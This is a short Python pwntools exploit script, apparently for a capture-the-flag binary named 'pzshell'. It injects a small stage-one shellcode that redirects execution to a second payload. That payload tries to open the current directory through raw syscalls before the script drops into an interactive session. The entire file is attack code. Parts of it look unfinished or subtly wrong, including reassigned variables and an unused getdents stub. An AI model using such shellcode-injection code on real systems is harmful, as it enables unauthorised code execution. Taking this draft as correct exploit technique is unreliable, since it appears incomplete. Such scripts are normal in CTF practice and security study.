from pwn import * 

p = process("./pzshell")

context.arch = "amd64"
sc = asm('sub dl,0x2')
sc += asm('xchg rsi,rdx')
sc += asm('jmp rsi')
log.info("length : " + str(len(sc)) )
pause()

diropen = asm("mov rax,0x4")

getdents = asm("mov rax,0x4e")

#open - rax:0x2 , rdi: filename, rsi: flag, rdx : mode 
diropen = "."+"\x00"
diropen +=asm("mov rax,0x2")
diropen +=asm("mov di,[rsi]")
diropen +=asm("mov rsi,0x0")
diropen +=asm("mov rdx,0x0")

p.send(sc)

p.sendline(diropen)

p.interactive()


